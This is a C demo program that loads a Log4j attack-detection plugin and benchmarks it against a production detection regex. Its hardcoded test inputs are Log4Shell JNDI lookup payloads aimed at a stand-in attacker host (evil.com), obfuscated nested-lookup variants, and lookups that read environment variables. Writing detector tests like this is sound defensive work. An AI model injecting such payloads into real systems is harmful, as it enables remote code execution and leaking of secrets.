/*
 * log4j 规则插件调用示例（纯 C，dlopen 方式）
 * ------------------------------------------------------------
 * 构建：cmake --build build --target example_call_log4j
 * 运行：./build/example_call_log4j
 *
 * 演示加载 liblog4j_rules.so 并对其 rule_check_text 传入写死的
 * 测试字符串（直接 JNDI / 嵌套混淆 / 敏感前缀 / 嵌套链 /
 * 良性结构 / 普通文本），输出命中攻击信息与命中区间；
 * 同时对每条输入跑线上生产正则（PCRE2），输出正则 vs 引擎
 * 的逐条命中对比。
 *
 * 插件接口：
 *   int         rule_abi()               版本号
 *   int         rule_attack_count()      插件包含的攻击数量
 *   AttackInfo* rule_attack(int i)       第 i 个攻击元信息
 *   int         rule_check_text(text, matched, startOff, endOff, max)
 *                                        返回命中攻击索引数与字符区间
 *
 * 注意：本例直接调插件接口，不做引擎的画像门控与 fast-path
 * 预筛（fragment/raw 攻击在引擎里仅在输入不是完整 SQL 时生效）。
 */
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#ifdef LOG4J_NO_PCRE2
#warning "PCRE2 not found: regex comparison disabled"
#else
#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#endif

/* 与 rule_plugin.h 中 AttackInfo 布局一致（5 个 const char*） */
typedef struct {
    const char* name;
    const char* severity;
    const char* action;
    const char* description;
    const char* profile;
} AttackInfo;

typedef int (*abi_fn)(void);
typedef int (*count_fn)(void);
typedef const AttackInfo* (*info_fn)(int);
typedef int (*check_fn)(const char*, int*, int*, int*, int);

/* ============ 移植时改这两个宏即可 ============ */
#define PLUGIN_PATH "./build/plugins/liblog4j_rules.so"
#define MAX_MATCHES 16
#define RULE_ABI    6

/* 计时：各侧循环取平均，避免单次调用抖动 */
#define RE_ITERS     20000
#define ENGINE_ITERS 2000

static double now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec * 1e6 + (double)ts.tv_nsec / 1e3;
}

/*
 * 线上生产正则（PCRE2，与 misc/compare_log4j_regex.sh 一致）。
 * 原 JSON 写法：
 *   "\\${((.*jndi:((ldap://)|(rmi://)).+)|(.*\\${((ower)|(upper)):.+)|(.*\\${.*:.*:-.+)|(.*\\${date:.+))}"
 */
static const char* PROD_REGEX =
    "\\${((.*jndi:((ldap://)|(rmi://)).+)|"
    "(.*\\${((ower)|(upper)):.+)|"
    "(.*\\${.*:.*:-.+)|"
    "(.*\\${date:.+))}";

/* 写死的测试字符串 */
static const char* TEST_INPUTS[] = {
    "${jndi:ldap://127.0.0.1:1389/a}",          /* 直接 JNDI          -> log4j_jndi */
    "${jndi:rmi://evil.com/exp}",               /* 直接 JNDI (rmi)    -> log4j_jndi */
    "${${lower:j}ndi:ldap://evil.com/a}",       /* 嵌套 lower 混淆    -> log4j_jndi */
    "${env:${jndi:ldap://evil.com/a}}",         /* env 包裹嵌套 jndi  -> log4j_jndi */
    "${jndi:${lower:l}dap://evil.com/a}",       /* 值内嵌套 lower     -> log4j_jndi */
    "${env:HOME}",                              /* 敏感前缀           -> log4j_sensitive */
    "${sys:java.version}",                      /* 敏感前缀           -> log4j_sensitive */
    "${lower:${upper:${env:PATH}}}",            /* 无 jndi 嵌套链     -> log4j_nested_chain */
    "${java:version}",                          /* 良性结构（检测层） -> log4j_expr (ALLOW) */
    "${date:MM-dd-yyyy}",                       /* 良性结构（检测层） -> log4j_expr (ALLOW) */
    "hello world",                              /* 普通文本           -> 无命中 */
    "user=jndi",                                /* 含 jndi 子串但非查找 -> 无命中 */
};

int main(void) {
#ifndef LOG4J_NO_PCRE2
    int errcode = 0;
    PCRE2_SIZE erroffset = 0;
    pcre2_code* re = pcre2_compile((PCRE2_SPTR)PROD_REGEX, PCRE2_ZERO_TERMINATED,
                                   0, &errcode, &erroffset, NULL);
    if (!re) {
        fprintf(stderr, "regex compile failed: %d at offset %zu\n",
                errcode, (size_t)erroffset);
        return 1;
    }
    pcre2_match_data* md = pcre2_match_data_create_from_pattern(re, NULL);
    if (!md) {
        fprintf(stderr, "pcre2 match_data alloc failed\n");
        pcre2_code_free(re);
        return 1;
    }
#endif

    void* h = dlopen(PLUGIN_PATH, RTLD_NOW);
    if (!h) {
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
#ifndef LOG4J_NO_PCRE2
        pcre2_match_data_free(md);
        pcre2_code_free(re);
#endif
        return 1;
    }

    abi_fn abi = (abi_fn)dlsym(h, "rule_abi");
    count_fn count = (count_fn)dlsym(h, "rule_attack_count");
    info_fn info = (info_fn)dlsym(h, "rule_attack");
    check_fn check = (check_fn)dlsym(h, "rule_check_text");
    if (!abi || !count || !info || !check) {
        fprintf(stderr, "dlsym failed: %s\n", dlerror());
#ifndef LOG4J_NO_PCRE2
        pcre2_match_data_free(md);
        pcre2_code_free(re);
#endif
        return 1;
    }

    if (abi() != RULE_ABI) {
        fprintf(stderr, "ABI mismatch: plugin=%d, expected=%d\n", abi(), RULE_ABI);
#ifndef LOG4J_NO_PCRE2
        pcre2_match_data_free(md);
        pcre2_code_free(re);
#endif
        return 1;
    }

    printf("ABI: %d, attacks: %d\n\n", abi(), count());

    size_t n_inputs = sizeof(TEST_INPUTS) / sizeof(TEST_INPUTS[0]);
    int total_engine = 0;
    int total_regex = 0;
    for (size_t k = 0; k < n_inputs; ++k) {
        const char* input = TEST_INPUTS[k];
        printf("=== input: %s\n", input);

#ifndef LOG4J_NO_PCRE2
        int rc = pcre2_match(re, (PCRE2_SPTR)input, PCRE2_ZERO_TERMINATED,
                             0, 0, md, NULL);
        int regex_hit = rc >= 0;
        total_regex += regex_hit;

        double t_re = now_us();
        for (int i = 0; i < RE_ITERS; ++i) {
            pcre2_match(re, (PCRE2_SPTR)input, PCRE2_ZERO_TERMINATED,
                        0, 0, md, NULL);
        }
        double re_us = (now_us() - t_re) / RE_ITERS;

        printf("    regex(prod): %s (%.2f us/call)\n",
               regex_hit ? "MATCH" : "NO MATCH", re_us);
#else
        printf("    regex(prod): (PCRE2 unavailable)\n");
#endif

        int matched[MAX_MATCHES], startOff[MAX_MATCHES], endOff[MAX_MATCHES];
        int n = check(input, matched, startOff, endOff, MAX_MATCHES);  // 结果 + warmup
        total_engine += n;

        double t_eng = now_us();
        for (int i = 0; i < ENGINE_ITERS; ++i) {
            check(input, matched, startOff, endOff, MAX_MATCHES);
        }
        double eng_us = (now_us() - t_eng) / ENGINE_ITERS;

        if (n == 0) {
            printf("    (no match) (%.2f us/call)\n\n", eng_us);
            continue;
        }
        for (int i = 0; i < n; ++i) {
            const AttackInfo* a = info(matched[i]);
            if (!a) continue;
            printf("    attack: %s [%s/%s] %s (%.2f us/call)\n",
                   a->name, a->severity, a->action, a->description, eng_us);
            if (startOff[i] >= 0 && endOff[i] >= startOff[i] &&
                endOff[i] < (int)strlen(input)) {
                printf("            matched: \"%.*s\"\n",
                       endOff[i] - startOff[i] + 1, input + startOff[i]);
            }
        }
        printf("\n");
    }

    printf("== 汇总：regex 命中 %d/%zu，engine 命中 %d/%zu（同一输入可比）\n",
           total_regex, n_inputs, total_engine, n_inputs);

    dlclose(h);
#ifndef LOG4J_NO_PCRE2
    pcre2_match_data_free(md);
    pcre2_code_free(re);
#endif
    return 0;
}
